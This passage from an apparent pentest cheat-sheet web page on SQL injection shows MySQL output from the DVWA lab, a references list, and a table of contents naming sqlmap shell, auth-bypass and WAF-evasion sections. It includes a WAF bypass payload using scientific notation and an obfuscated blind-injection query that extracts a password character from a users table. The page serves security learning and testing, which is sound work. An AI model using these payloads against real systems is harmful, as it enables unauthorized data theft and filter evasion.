+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> database_name  <span style="color:#f92672">|</span> <span style="color:#66d9ef">table_name</span>            <span style="color:#f92672">|</span> last_update         <span style="color:#f92672">|</span> n_rows <span style="color:#f92672">|</span> clustered_index_size <span style="color:#f92672">|</span> sum_of_other_index_sizes <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> dvwa           <span style="color:#f92672">|</span> guestbook             <span style="color:#f92672">|</span> <span style="color:#ae81ff">2017</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span><span style="color:#f92672">-</span><span style="color:#ae81ff">19</span> <span style="color:#ae81ff">21</span>:<span style="color:#ae81ff">02</span>:<span style="color:#ae81ff">57</span> <span style="color:#f92672">|</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">|</span>                    <span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span>                        <span style="color:#ae81ff">0</span> <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> dvwa           <span style="color:#f92672">|</span> users                 <span style="color:#f92672">|</span> <span style="color:#ae81ff">2017</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span><span style="color:#f92672">-</span><span style="color:#ae81ff">19</span> <span style="color:#ae81ff">21</span>:<span style="color:#ae81ff">03</span>:<span style="color:#ae81ff">07</span> <span style="color:#f92672">|</span>      <span style="color:#ae81ff">5</span> <span style="color:#f92672">|</span>                    <span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span>                        <span style="color:#ae81ff">0</span> <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">show</span> tables <span style="color:#66d9ef">in</span> dvwa;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> Tables_in_dvwa <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> guestbook      <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> users          <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------+
+</span></span></span></code></pre></div><p>Version Alternative</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">select</span> <span style="color:#f92672">@@</span>innodb_version;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> <span style="color:#f92672">@@</span>innodb_version <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> <span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">31</span>           <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">select</span> <span style="color:#f92672">@@</span><span style="color:#66d9ef">version</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">-------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> <span style="color:#f92672">@@</span><span style="color:#66d9ef">version</span>               <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">-------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> <span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">31</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0</span>ubuntu0.<span style="color:#ae81ff">15</span>.<span style="color:#ae81ff">10</span>.<span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">-------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>mysql<span style="color:#f92672">&gt;</span> mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">select</span> <span style="color:#66d9ef">version</span>();
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">-------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> <span style="color:#66d9ef">version</span>()               <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">-------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> <span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">31</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0</span>ubuntu0.<span style="color:#ae81ff">15</span>.<span style="color:#ae81ff">10</span>.<span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">-------------------------+
+</span></span></span></code></pre></div><h4 id="waf-bypass-for-mysql-using-scientific-notation">
+  WAF bypass for MySQL using scientific notation
+  <a class="anchor" href="#waf-bypass-for-mysql-using-scientific-notation">#</a>
+</h4>
+<p>Blocked</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; or &#39;&#39;=&#39;</span>
+</span></span></code></pre></div><p>Working</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; or 1.e(&#39;&#39;)=&#39;</span>
+</span></span></code></pre></div><p>Obfuscated query</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">1</span>.e(ascii <span style="color:#ae81ff">1</span>.e(<span style="color:#66d9ef">substring</span>(<span style="color:#ae81ff">1</span>.e(<span style="color:#66d9ef">select</span> password <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">limit</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span>.e,<span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span>.e) <span style="color:#ae81ff">1</span>.e,<span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span>.e,<span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span>.e)<span style="color:#ae81ff">1</span>.e)<span style="color:#ae81ff">1</span>.e) <span style="color:#f92672">=</span> <span style="color:#ae81ff">70</span> <span style="color:#66d9ef">or</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;2
+</span></span></span></code></pre></div><h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li>Detect SQLi
+<ul>
+<li>
+  <a href="https://gerbenjavado.com/manual-sql-injection-discovery-tips/">Manual SQL Injection Discovery Tips</a></li>
+<li>
+  <a href="https://sqlwiki.netspi.com/">NetSPI SQL Injection Wiki</a></li>
+</ul>
+</li>
+<li>MySQL:
+<ul>
+<li>
+  <a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">PentestMonkey&rsquo;s mySQL injection cheat sheet</a></li>
+<li>
+  <a href="https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/">Reiners mySQL injection Filter Evasion Cheatsheet</a></li>
+<li>
+  <a href="https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/">Alternative for Information_Schema.Tables in MySQL</a></li>
+<li>
+  <a href="https://websec.ca/kb/sql_injection">The SQL Injection Knowledge base</a></li>
+</ul>
+</li>
+<li>MSSQL:
+<ul>
+<li>
+  <a href="http://evilsql.com/main/page2.php">EvilSQL&rsquo;s Error/Union/Blind MSSQL Cheatsheet</a></li>
+<li>
+  <a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">PentestMonkey&rsquo;s MSSQL SQLi injection Cheat Sheet</a></li>
+</ul>
+</li>
+<li>ORACLE:
+<ul>
+<li>
+  <a href="http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet">PentestMonkey&rsquo;s Oracle SQLi Cheatsheet</a></li>
+</ul>
+</li>
+<li>POSTGRESQL:
+<ul>
+<li>
+  <a href="http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet">PentestMonkey&rsquo;s Postgres SQLi Cheatsheet</a></li>
+</ul>
+</li>
+<li>Others
+<ul>
+<li>
+  <a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/">SQLi Cheatsheet - NetSparker</a></li>
+<li>
+  <a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">Access SQLi Cheatsheet</a></li>
+<li>
+  <a href="http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet">PentestMonkey&rsquo;s Ingres SQL Injection Cheat Sheet</a></li>
+<li>
+  <a href="http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet">Pentestmonkey&rsquo;s DB2 SQL Injection Cheat Sheet</a></li>
+<li>
+  <a href="http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet">Pentestmonkey&rsquo;s Informix SQL Injection Cheat Sheet</a></li>
+<li>
+  <a href="https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet">SQLite3 Injection Cheat sheet</a></li>
+<li>
+  <a href="http://rails-sqli.org/">Ruby on Rails (Active Record) SQL Injection Guide</a></li>
+<li>
+  <a href="http://www.forkbombers.com/2016/07/sqlmap-tamper-scripts-update.html">ForkBombers SQLMap Tamper Scripts Update</a></li>
+<li>
+  <a href="https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/">SQLi in INSERT worse than SELECT</a></li>
+<li>
+  <a href="https://gerbenjavado.com/manual-sql-injection-discovery-tips/">Manual SQL Injection Tips</a></li>
+</ul>
+</li>
+<li>Second Order:
+<ul>
+<li>
+  <a href="https://www.notsosecure.com/analyzing-cve-2018-6376/">Analyzing CVE-2018-6376 – Joomla!, Second Order SQL Injection</a></li>
+<li>
+  <a href="https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/">Exploiting Second Order SQLi Flaws by using Burp &amp; Custom Sqlmap Tamper</a></li>
+</ul>
+</li>
+<li>Sqlmap:
+<ul>
+<li>
+  <a href="https://twitter.com/zh4ck/status/972441560875970560">#SQLmap protip @zh4ck</a></li>
+</ul>
+</li>
+<li>WAF:
+<ul>
+<li>
+  <a href="https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2013/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf">SQLi Optimization and Obfuscation Techniques</a> by Roberto Salgado</li>
+<li>
+  <a href="https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/">A Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection</a></li>
+</ul>
+</li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/edit/main/exampleSite/content.en/docs/sql_injection.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#sql-injection">SQL injection</a>
+      <ul>
+        <li><a href="#entry-point-detection">Entry point detection</a></li>
+        <li><a href="#dbms-identification">DBMS Identification</a></li>
+        <li><a href="#sql-injection-using-sqlmap">SQL injection using SQLmap</a>
+          <ul>
+            <li><a href="#basic-arguments-for-sqlmap">Basic arguments for SQLmap</a></li>
+            <li><a href="#load-a-request-file-and-use-mobile-user-agent">Load a request file and use mobile user-agent</a></li>
+            <li><a href="#custom-injection-in-useragentheaderreferercookie">Custom injection in UserAgent/Header/Referer/Cookie</a></li>
+            <li><a href="#second-order-injection">Second order injection</a></li>
+            <li><a href="#shell">Shell</a></li>
+            <li><a href="#crawl-a-website-with-sqlmap-and-auto-exploit">Crawl a website with SQLmap and auto-exploit</a></li>
+            <li><a href="#using-tor-with-sqlmap">Using TOR with SQLmap</a></li>
+            <li><a href="#using-a-proxy-with-sqlmap">Using a proxy with SQLmap</a></li>
+            <li><a href="#using-chrome-cookie-and-a-proxy">Using Chrome cookie and a Proxy</a></li>
+            <li><a href="#using-suffix-to-tamper-the-injection">Using suffix to tamper the injection</a></li>
+            <li><a href="#general-tamper-option-and-tampers-list">General tamper option and tamper&rsquo;s list</a></li>
+            <li><a href="#sqlmap-without-sql-injection">SQLmap without SQL injection</a></li>
+          </ul>
+        </li>
+        <li><a href="#authentication-bypass">Authentication bypass</a></li>
+        <li><a href="#authentication-bypass-raw-md5-sha1">Authentication Bypass (Raw MD5 SHA1)</a></li>
+        <li><a href="#polyglot-injection-multicontext">Polyglot injection (multicontext)</a></li>
+        <li><a href="#routed-injection">Routed injection</a></li>
+        <li><a href="#insert-statement---on-duplicate-key-update">Insert Statement - ON DUPLICATE KEY UPDATE</a></li>
+        <li><a href="#waf-bypass">WAF Bypass</a>
+          <ul>
+            <li><a href="#white-spaces-alternatives">White spaces alternatives</a></li>
+            <li><a href="#no-comma">No Comma</a></li>
+            <li><a href="#no-equal">No Equal</a></li>
+            <li><a href="#case-modification">Case modification</a></li>
+            <li><a href="#obfuscation-by-dbms">Obfuscation by DBMS</a></li>
+            <li><a href="#more-mysql-specific">More MySQL specific</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
